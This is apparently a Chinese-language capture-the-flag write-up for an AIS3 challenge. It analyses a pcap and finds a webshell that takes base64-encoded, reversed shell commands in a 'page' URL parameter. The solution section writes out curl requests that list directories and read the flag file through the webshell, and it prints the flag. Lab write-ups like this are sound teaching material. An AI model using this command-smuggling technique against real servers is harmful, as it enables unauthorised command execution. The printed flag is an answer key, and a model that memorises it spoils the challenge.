# MISC - [震撼彈] AIS3 官網疑遭駭
## 題目理解
給了一個 pcap，直接開 wireshark，看題目名字就知道要找 http，每個送的 host 都一樣

## 觀察
每個網址都帶一個 page 參數，後面接著 ls . 的 base64，只有一個是 . sl 的 base64，而且也只有它是用 firefox 瀏覽，其他都是 curl

不過直接連 ip:8100 會是一個什麼都沒有的 nginx，掃目錄、做各種滲透測試、弱點分析都找不到東西

所以就掉進一個花我非常久時間的坑，那個 magic.ais3.org 本來以為已經沒了，沒想到是要用 domain 才能瀏覽，所以就改個 /etc/hosts 就可以得到 webshell 了

## 解法
```
echo "ls .." | base64 | rev
curl magic.ais3.org:8100/Index.php?page=K4iLgMHb

echo "cat ../flag_c603222fc7a23ee4ae2d59c8eb2ba84d" | base64 | rev
curl magic.ais3.org:8100/Index.php?page=KQGN4EmYyIWZ4MWO1QmMlFGNlV2MyE2NjZmMyIzMwYzYfdWYsZ2Lu4CI0F2
```

* flag: `AIS3{0h!Why_do_U_kn0w_this_sh3ll1!1l!}`
